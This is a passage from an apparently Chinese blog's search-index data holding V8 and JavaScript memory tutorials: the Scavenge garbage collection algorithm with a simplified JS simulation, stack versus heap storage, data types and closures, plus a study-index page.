算法通过将堆内存分为两部分（通常称为半空间，semispaces），在对象很少从年轻代晋升到老年代的情况下，可以非常快速地进行垃圾回收。</p>\n</li>\n<li><p>复制算法：在一个半空间（活动空间）中分配对象，当这个空间满了的时候，Scavenge 算法会检查存活的对象，并将它们复制到另一个半空间（空闲空间），同时回收原空间的所有内存。这一过程中，活着的对象也可能根据其存活时间被晋升到老年代空间。</p>\n</li>\n<li><p>暂停时间短：Scavenge 算法在执行垃圾回收期间需要暂停程序的执行（Stop-The-World），但由于只作用于年轻代（这部分空间相对较小），导致回收过程中的暂停时间很短，这对于需要高响应性的应用程序非常重要。</p>\n</li>\n<li><p>空间换时间：由于 Scavenge 算法使用了两个半空间，并且一次只能使用一个半空间进行对象分配，实际上它牺牲了一半的堆内存空间以换取垃圾回收的速度和效率。这种方法对于内存不是非常紧张的现代应用通常是可接受的。</p>\n</li>\n</ul>\n<h2 id=\"应用\"><a href=\"#应用\" class=\"headerlink\" title=\"应用\"></a>应用</h2><p>Scavenge 算法（尤其是其改进版本，如 V8 引擎中的 Orinoco 垃圾回收器）在提供快速回收和减少暂停时间方面表现出色，特别适用于需要处理大量短命对象且对暂停时间敏感的场景，如 Web 服务器和交云性高的前端应用等。</p>\n<h2 id=\"js模拟算法实现\"><a href=\"#js模拟算法实现\" class=\"headerlink\" title=\"js模拟算法实现\"></a>js 模拟算法实现</h2><p>实现一个完整的 Scavenge 算法或任何一种垃圾回收算法在 JavaScript 中是不切实际的，因为 JavaScript 语言本身并不允许直接控制内存分配或回收细节。垃圾回收是由 JavaScript 引擎（比如 V8、SpiderMonkey 或 JavaScriptCore）在底层实现的，开发者通常无法（也不需要）直接操作这个过程。</p>\n<p>但是，我们可以试着模拟一个简化版的 Scavenge 垃圾回收算法的行为来帮助理解其工作原理。Scavenge 算法使用两块大小相等的内存区域（称为 semispaces）—— 一块是活动空间，另一块是空闲空间。对象最初分配在活动空间中，当活动空间填满时，算法会遍历活动空间，将存活的对象复制到空闲空间中，并清理整个活动空间。</p>\n<p>请注意，下面的代码示例是一个极度简化的模型，用于教育目的，不能用于生产环境中的垃圾回收。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ScavengeGC</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">size</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">size</span> = size; <span class=\"comment\">// 内存空间的大小</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">activeSpace</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Map</span>(); <span class=\"comment\">// 活动空间</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">inactiveSpace</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Map</span>(); <span class=\"comment\">// 空闲空间</span></span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_\">allocate</span>(<span class=\"params\">object</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">activeSpace</span>.<span class=\"property\">size</span> &gt;= <span class=\"variable language_\">this</span>.<span class=\"property\">size</span>) {</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"title function_\">scavenge</span>(); <span class=\"comment\">// 如果活动空间已满，运行垃圾回收</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">activeSpace</span>.<span class=\"property\">size</span> &lt; <span class=\"variable language_\">this</span>.<span class=\"property\">size</span>) {</span><br><span class=\"line\">      <span class=\"comment\">// 分配对象到活动空间</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> objectId = <span class=\"title class_\">Symbol</span>(); <span class=\"comment\">// 生成一个唯一标识符作为对象的ID</span></span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">activeSpace</span>.<span class=\"title function_\">set</span>(objectId, object);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> objectId;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">'Out of memory'</span>); <span class=\"comment\">// 内存不足</span></span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_\">scavenge</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 将存活的对象从活动空间复制到空闲空间</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> [id, obj] <span class=\"keyword\">of</span> <span class=\"variable language_\">this</span>.<span class=\"property\">activeSpace</span>) {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"title function_\">isAlive</span>(obj)) { <span class=\"comment\">// 假设有一个方法来判断对象是否存活</span></span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">inactiveSpace</span>.<span class=\"title function_\">set</span>(id, obj);</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\">// 清理活动空间并交换活动空间和空闲空间</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">activeSpace</span>.<span class=\"title function_\">clear</span>();</span><br><span class=\"line\">    [<span class=\"variable language_\">this</span>.<span class=\"property\">activeSpace</span>, <span class=\"variable language_\">this</span>.<span class=\"property\">inactiveSpace</span>] = [<span class=\"variable language_\">this</span>.<span class=\"property\">inactiveSpace</span>, <span class=\"variable language_\">this</span>.<span class=\"property\">activeSpace</span>];</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_\">isAlive</span>(<span class=\"params\">obj</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 为简化模型，假设所有对象都是存活的</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一个简单的测试实例</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> gc = <span class=\"keyword\">new</span> <span class=\"title class_\">ScavengeGC</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 假设空间大小为10个对象</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 模拟分配和回收过程</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">20</span>; i++) {</span><br><span class=\"line\">  gc.<span class=\"title function_\">allocate</span>({ <span class=\"attr\">data</span>: i }); <span class=\"comment\">// 分配20个对象来观察垃圾回收行为</span></span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这个示例中的 ScavengeGC 类实例化时创建了两块 “内存空间”（实际上是使用 Map 对象模拟的），并通过 allocate 方法来模拟对象分配。当活动空间满了，scavenge 方法模拟了垃圾回收过程：存活对象被复制到空闲空间中，然后清理和交换两个空间。</p>\n<p>请记住，这只是一个非常基础和简化的模型，真实的 Scavenge 算法要复杂得多，且具体实现细节因 JavaScript 引擎的不同而异。</p>\n"},{"title":"栈空间和堆空间：数据是如何存储的？","url":"/browser/v8/StackAndHeap.html","content":"<p>对于前端开发者来说，JavaScript 的内存机制是一个不被经常提及的概念 ，因此很容易被忽视。特别是一些非计算机专业的同学，对内存机制可能没有非常清晰的认识，甚至有些同学根本就不知道 JavaScript 的内存机制是什么。</p>\n<p>但是如果你想成为行业专家，并打造高性能前端应用，那么你就必须要搞清楚 JavaScript 的内存机制了。</p>\n<p>其实，要搞清楚 JavaScript 的内存机制并不是一件很困难的事，在接下来的三篇文章（数据在内存中的存放、JavaScript 处理垃圾回收以及 V8 执行代码）中，我们将通过内存机制的介绍，循序渐进带你走进 JavaScript 内存的世界。</p>\n<p>今天我们讲述第一部分的内容 ——JavaScript 中的数据是如何存储在内存中的。虽然 JavaScript 并不需要直接去管理内存，但是在实际项目中为了能避开一些不必要的坑，你还是需要了解数据在内存中的存储方式的。</p>\n<h2 id=\"让人疑惑的代码\"><a href=\"#让人疑惑的代码\" class=\"headerlink\" title=\"让人疑惑的代码\"></a>让人疑惑的代码</h2><p>首先，我们先看下面这两段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = a</span><br><span class=\"line\">    a = <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(a)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(b)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = {<span class=\"attr\">name</span>:<span class=\"string\">\"极客时间\"</span>}</span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = a</span><br><span class=\"line\">    a.<span class=\"property\">name</span> = <span class=\"string\">\"极客邦\"</span> </span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(a)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(b)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>若执行上述这两段代码，你知道它们输出的结果是什么吗？下面我们就来一个一个分析下。</p>\n<p>执行第一段代码，打印出来 a 的值是 2，b 的值是 1，这没什么难以理解的。</p>\n<p>接着，再执行第二段代码，你会发现，仅仅改变了 a 中 name 的属性值，但是最终 a 和 b 打印出来的值都是 {name:” 极客邦”}。这就和我们预期的不一致了，因为我们想改变的仅仅是 a 的内容，但 b 的内容也同时被改变了。</p>\n<p>要彻底弄清楚这个问题，我们就得先从 “JavaScript 是什么类型的语言” 讲起。</p>\n<h2 id=\"JavaScript是什么类型的语言\"><a href=\"#JavaScript是什么类型的语言\" class=\"headerlink\" title=\"JavaScript是什么类型的语言\"></a>JavaScript 是什么类型的语言</h2><p>每种编程语言都具有内建的数据类型，但它们的数据类型常有不同之处，使用方式也很不一样，比如 C 语言在定义变量之前，就需要确定变量的类型，你可以看下面这段 C 代码：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">{</span><br><span class=\"line\">   <span class=\"type\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">   <span class=\"type\">char</span>* b = <span class=\"string\">\"极客时间\"</span>;</span><br><span class=\"line\">   <span class=\"type\">bool</span> c = <span class=\"literal\">true</span>;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上述代码声明变量的特点是：在声明变量之前需要先定义变量类型。<strong>我们把这种在使用之前就需要确认其变量数据类型的称为静态语言</strong>。</p>\n<p>相反地，<strong>我们把在运行过程中需要检查数据类型的语言称为动态语言</strong>。比如我们所讲的 JavaScript 就是动态语言，因为在声明变量之前并不需要确认其数据类型。</p>\n<p>虽然 C 语言是静态，但是在 C 语言中，我们可以把其他类型数据赋予给一个声明好的变量，如：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">c = a</span><br></pre></td></tr></tbody></table></figure>\n\n<p>前面代码中，我们把 int 型的变量 a 赋值给了 bool 型的变量 c，这段代码也是可以编译执行的，因为在赋值过程中，C 编译器会把 int 型的变量悄悄转换为 bool 型的变量，我们通常把这种偷偷转换的操作称为<strong>隐式类型转换</strong>。而<strong>支持隐式类型转换的语言称为弱类型语言，不支持隐式类型转换的语言称为强类型语言</strong>。在这点上，C 和 JavaScript 都是弱类型语言。</p>\n<p>对于各种语言的类型，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f08c70ea9cb14030a18d5.png\" alt=\"语言类型图\"></p>\n<h2 id=\"JavaScript的数据类型\"><a href=\"#JavaScript的数据类型\" class=\"headerlink\" title=\"JavaScript的数据类型\"></a>JavaScript 的数据类型</h2><p>现在我们知道了，<strong>JavaScript 是一种弱类型的、动态的语言</strong>。那这些特点意味着什么呢？</p>\n<ul>\n<li><strong>弱类型</strong>，意味着你不需要告诉 JavaScript 引擎这个或那个变量是什么数据类型，JavaScript 引擎在运行代码的时候自己会计算出来。</li>\n<li><strong>动态</strong>，意味着你可以使用同一个变量保存不同类型的数据。<br>那么接下来，我们再来看看 JavaScript 的数据类型，你可以看下面这段代码：</li>\n</ul>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> bar</span><br><span class=\"line\">bar = <span class=\"number\">12</span> </span><br><span class=\"line\">bar = <span class=\"string\">\"极客时间\"</span></span><br><span class=\"line\">bar = <span class=\"literal\">true</span></span><br><span class=\"line\">bar = <span class=\"literal\">null</span></span><br><span class=\"line\">bar = {<span class=\"attr\">name</span>:<span class=\"string\">\"极客时间\"</span>}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>从上述代码中你可以看出，我们声明了一个 bar 变量，然后可以使用各种类型的数据值赋予给该变量。</p>\n<p>在 JavaScript 中，如果你想要查看一个变量到底是什么类型，可以使用 “typeof” 运算符。具体使用方式如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> bar</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"keyword\">typeof</span> bar)  <span class=\"comment\">//undefined</span></span><br><span class=\"line\">bar = <span class=\"number\">12</span> </span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"keyword\">typeof</span> bar) <span class=\"comment\">//number</span></span><br><span class=\"line\">bar = <span class=\"string\">\"极客时间\"</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"keyword\">typeof</span> bar)<span class=\"comment\">//string</span></span><br><span class=\"line\">bar = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"keyword\">typeof</span> bar) <span class=\"comment\">//boolean</span></span><br><span class=\"line\">bar = <span class=\"literal\">null</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"keyword\">typeof</span> bar) <span class=\"comment\">//object</span></span><br><span class=\"line\">bar = {<span class=\"attr\">name</span>:<span class=\"string\">\"极客时间\"</span>}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"keyword\">typeof</span> bar) <span class=\"comment\">//object</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>执行这段代码，你可以看到打印出来了不同的数据类型，有 undefined、number、boolean、object 等。那么接下来我们就来谈谈 JavaScript 到底有多少种数据类型。</p>\n<p>其实 JavaScript 中的数据类型一种有 8 种，它们分别是：</p>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td> Boolean</td>\n<td> 只有 true 和 false 两个值。</td>\n</tr>\n<tr>\n<td>Null</td>\n<td> 只有一个值 null。</td>\n</tr>\n<tr>\n<td>Undefined</td>\n<td> 一个没有被赋值的变量会有个默认值 undefined，变量提升时的默认值也是  undefined。</td>\n</tr>\n<tr>\n<td>Number</td>\n<td> 根据 ECMAScript 标准，JavaScript 中只有一种数字类型：基于 IEEE 754 标准的双精度 64 位二进制格式的值，-（263-1） 到 263-1。</td>\n</tr>\n<tr>\n<td>BigInt</td>\n<td>JavaScript 中一个新的数字类型，可以用任意精度表示整数。使用 BigInt，即使超出 Number 的安全整数范围限制，也可以安全地存储和操作。</td>\n</tr>\n<tr>\n<td>String</td>\n<td> 用于表示文本数据。不同于类 C 语言，JavaScript 的字符串是不可更改的。</td>\n</tr>\n<tr>\n<td>Symbol</td>\n<td> 符号类型是唯一的并且是不可修改的，通常用来作为 Object 的 key。</td>\n</tr>\n<tr>\n<td>Object</td>\n<td> 在 JavaScript 里，对象可以被看作是一组属性的集合。</td>\n</tr>\n</tbody></table>\n<p>了解这些类型之后，还有三点需要你注意一下。</p>\n<p>第一点，使用 typeof 检测 Null 类型时，返回的是 Object。这是当初 JavaScript 语言的一个 Bug，一直保留至今，之所以一直没修改过来，主要是为了兼容老的代码。</p>\n<p>第二点，Object 类型比较特殊，它是由上述 7 种类型组成的一个包含了 key-value 对的数据类型。如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> myObj = {</span><br><span class=\"line\">    <span class=\"attr\">name</span>:<span class=\"string\">'极客时间'</span>,</span><br><span class=\"line\">    <span class=\"attr\">update</span>:<span class=\"keyword\">function</span>(<span class=\"params\"></span>){....}</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>从中你可以看出来，Object 是由 key-value 组成的，其中的 vaule 可以是任何类型，包括函数，这也就意味着你可以通过 Object 来存储函数，Object 中的函数又称为方法，比如上述代码中的 update 方法。</p>\n<p>第三点，我们把前面的 7 种数据类型称为<strong>原始类型</strong>，把最后一个对象类型称为<strong>引用类型</strong>，之所以把它们区分为两种不同的类型，是因为它们在内存中存放的位置不一样。到底怎么个不一样法呢？接下来，我们就来讲解一下 JavaScript 的原始类型和引用类型到底是怎么储存的。</p>\n<h2 id=\"内存空间\"><a href=\"#内存空间\" class=\"headerlink\" title=\"内存空间\"></a>内存空间</h2><p>要理解 JavaScript 在运行过程中数据是如何存储的，你就得先搞清楚其存储空间的种类。下面是我画的 JavaScript 的内存模型，你可以参考下：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f365a0ea9cb140367ced0.png\" alt=\"JavaScript内存模型\"></p>\n<p>从图中可以看出， 在 JavaScript 的执行过程中， 主要有三种类型内存空间，分别是<strong>代码空间</strong>、<strong>栈空间</strong>和<strong>堆空间</strong>。</p>\n<p>其中的代码空间主要是存储可执行代码的，这个我们后面再做介绍，今天主要来说说栈空间和堆空间。</p>\n<h3 id=\"栈空间和堆空间\"><a href=\"#栈空间和堆空间\" class=\"headerlink\" title=\"栈空间和堆空间\"></a>栈空间和堆空间</h3><p>这里的栈空间就是我们之前反复提及的调用栈，是用来存储执行上下文的。为了搞清楚栈空间是如何存储数据的，我们还是先看下面这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"string\">\"极客时间\"</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = a</span><br><span class=\"line\">    <span class=\"keyword\">var</span> c = {<span class=\"attr\">name</span>:<span class=\"string\">\"极客时间\"</span>}</span><br><span class=\"line\">    <span class=\"keyword\">var</span> d = c</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>前面文章我们已经讲解过了，当执行一段代码时，需要先编译，并创建执行上下文，然后再按照顺序执行代码。那么下面我们来看看，当执行到第 3 行代码时，其调用栈的状态，你可以参考下面这张调用栈状态图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f39710ea9cb1403700ee8.png\" alt=\"执行到第3行时的调用栈状态图\"></p>\n<p>从图中可以看出来，当执行到第 3 行时，变量 a 和变量 b 的值都被保存在执行上下文中，而执行上下文又被压入到栈中，所以你也可以认为变量 a 和变量 b 的值都是存放在栈中的。</p>\n<p>接下来继续执行第 4 行代码，由于 JavaScript 引擎判断右边的值是一个引用类型，这时候处理的情况就不一样了，JavaScript 引擎并不是直接将该对象存放到变量环境中，而是将它分配到堆空间里面，分配后该对象会有一个在 “堆” 中的地址，然后再将该数据的地址写进 c 的变量值，最终分配好内存的示意图如下所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f39c70ea9cb140370a882.png\" alt=\"对象类型是“堆”来存储\"></p>\n<p>从上图你可以清晰地观察到，对象类型是存放在堆空间的，在栈空间中只是保留了对象的引用地址，当 JavaScript 需要访问该数据的时候，是通过栈中的引用地址来访问的，相当于多了一道转手流程。</p>\n<p>好了，现在你应该知道了<strong>原始类型的数据值都是直接保存在 “栈” 中的，引用类型的值是存放在 “堆” 中的</strong>。不过你也许会好奇，为什么一定要分 “堆” 和 “栈” 两个存储空间呢？所有数据直接存放在 “栈” 中不就可以了吗？</p>\n<p>答案是不可以的。这是因为 JavaScript 引擎需要用栈来维护程序执行期间上下文的状态，如果栈空间大了话，所有的数据都存放在栈空间里面，那么会影响到上下文切换的效率，进而又影响到整个程序的执行效率。比如文中的 foo 函数执行结束了，JavaScript 引擎需要离开当前的执行上下文，只需要将指针下移到上个执行上下文的地址就可以了，foo 函数执行上下文栈区空间全部回收，具体过程你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f3adb0ea9cb140372c501.png\" alt=\"调用栈中切换执行上下文状态\"></p>\n<p>所以<strong>通常情况下，栈空间都不会设置太大，主要用来存放一些原始类型的小数据</strong>。而引用类型的数据占用的空间都比较大，所以这一类数据会被存放到堆中，<strong>堆空间很大，能存放很多大的数据</strong>，不过缺点是分配内存和回收内存都会占用一定的时间。</p>\n<p>解释了程序在执行过程中为什么需要堆和栈两种数据结构后，我们还是回到示例代码那里，看看它最后一步将变量 c 赋值给变量 d 是怎么执行的？</p>\n<p>在 JavaScript 中，赋值操作和其他语言有很大的不同，<strong>原始类型的赋值会完整复制变量值，而引用类型的赋值是复制引用地址</strong>。</p>\n<p>所以 <code>d=c</code> 的操作就是把 c 的引用地址赋值给 d，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f3b720ea9cb140373eef6.png\" alt=\"引用赋值\"></p>\n<p>从图中你可以看到，变量 c 和变量 d 都指向了同一个堆中的对象，所以这就很好地解释了文章开头的那个问题，通过 c 修改 name 的值，变量 d 的值也跟着改变，归根结底它们是同一个对象。</p>\n<h2 id=\"再谈闭包\"><a href=\"#再谈闭包\" class=\"headerlink\" title=\"再谈闭包\"></a>再谈闭包</h2><p>现在你知道了作用域内的原始类型数据会被存储到栈空间，引用类型会被存储到堆空间，基于这两点的认知，我们再深入一步，探讨下闭包的内存模型。</p>\n<p>例如下面这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">var</span> myName = <span class=\"string\">\"极客时间\"</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> test1 = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> test2 = <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> innerBar = { </span><br><span class=\"line\">        <span class=\"attr\">setName</span>:<span class=\"keyword\">function</span>(<span class=\"params\">newName</span>){</span><br><span class=\"line\">            myName = newName</span><br><span class=\"line\">        },</span><br><span class=\"line\">        <span class=\"attr\">getName</span>:<span class=\"keyword\">function</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(test1)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> myName</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> innerBar</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">var</span> bar = <span class=\"title function_\">foo</span>()</span><br><span class=\"line\">bar.<span class=\"title function_\">setName</span>(<span class=\"string\">\"极客邦\"</span>)</span><br><span class=\"line\">bar.<span class=\"title function_\">getName</span>()</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(bar.<span class=\"title function_\">getName</span>())</span><br></pre></td></tr></tbody></table></figure>\n\n<p>当执行这段代码的时候，你应该有过这样的分析：由于变量 myName、test1、test2 都是原始类型数据，所以在执行 foo 函数的时候，它们会被压入到调用栈中；当 foo 函数执行结束之后，调用栈中 foo 函数的执行上下文会被销毁，其内部变量 myName、test1、test2 也应该一同被销毁。</p>\n<p>但是在那篇文章中，我们介绍了当 foo 函数的执行上下文销毁时，由于 foo 函数产生了闭包，所以变量 myName 和 test1 并没有被销毁，而是保存在内存中，那么应该如何解释这个现象呢？</p>\n<p>要解释这个现象，我们就得站在内存模型的角度来分析这段代码的执行流程。</p>\n<ol>\n<li>当 JavaScript 引擎执行到 foo 函数时，首先会编译，并创建一个空执行上下文。</li>\n<li>在编译过程中，遇到内部函数 setName，JavaScript 引擎还要对内部函数做一次快速的词法扫描，发现该内部函数引用了 foo 函数中的 myName 变量，由于是内部函数引用了外部函数的变量，所以 JavaScript 引擎判断这是一个闭包，于是在堆空间创建换一个 “closure (foo)” 的对象（这是一个内部对象，JavaScript 是无法访问的），用来保存 myName 变量。</li>\n<li>接着继续扫描到 getName 方法时，发现该函数内部还引用变量 test1，于是 JavaScript 引擎又将 test1 添加到 “closure (foo)” 对象中。这时候堆中的 “closure (foo)” 对象中就包含了 myName 和 test1 两个变量了。</li>\n<li>由于 test2 并没有被内部函数引用，所以 test2 依然保存在调用栈中。<br>通过上面的分析，我们可以画出执行到 foo 函数中 “return innerBar” 语句时的调用栈状态，如下图所示：</li>\n</ol>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f3cce0ea9cb140376c689.png\" alt=\"闭包的产生过程\"></p>\n<p>从上图你可以清晰地看出，当执行到 foo 函数时，闭包就产生了；当 foo 函数执行结束之后，返回的 getName 和 setName 方法都引用 “closure (foo)” 对象，所以即使 foo 函数退出了，“ closure (foo)” 依然被其内部的 getName 和 setName 方法引用。所以在下次调用 <code>bar.setName</code> 或者 <code>bar.getName</code> 时，创建的执行上下文中就包含了 “closure (foo)”。</p>\n<p>总的来说，产生闭包的核心有两步：第一步是需要预扫描内部函数；第二步是把内部函数引用的外部变量保存到堆中。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就讲到这里，下面我来简单总结下今天的要点。</p>\n<p>我们介绍了 JavaScript 中的 8 种数据类型，它们可以分为两大类 —— 原始类型和引用类型。</p>\n<p>其中，原始类型的数据是存放在栈中，引用类型的数据是存放在堆中的。堆中的数据是通过引用和变量关联起来的。也就是说，JavaScript 的变量是没有数据类型的，值才有数据类型，变量可以随时持有任何类型的数据。</p>\n<p>然后我们分析了，在 JavaScript 中将一个原始类型的变量 a 赋值给 b，那么 a 和 b 会相互独立、互不影响；但是将引用类型的变量 a 赋值给变量 b，那会导致 a、b 两个变量都同时指向了堆中的同一块数据。</p>\n<p>最后，我们还站在内存模型的视角分析了闭包的产生过程。</p>\n"},{"title":"V8 学习流程","url":"/browser/v8/index.html","content":"<p><a href=\"/browser/v8/StackAndHeap.html\">01. 栈空间和堆空间</a><br><a href=\"/browser/v8/GarbageCollection.html\">02. 垃圾回收</a><br><a href=\"/browser/v8/CompilerInterpreter.html\">03. 编译器和解释器</a><br><a href=\"/browser/v8/ScavengeAlgorithm.html\">04. Scavenge 算法</a><br><a href=\"/browser/v8/MarkSweep.html\">05. Mark-Sweep 算法</a><br><a href=\"/browser/v8/MarkCompact.html\">06. Mark-Compact 算法</a><br><a href=\"/browser/v8/IncrementalMarking.html\">07. Incremental Marking 算法</a></p>\n"}]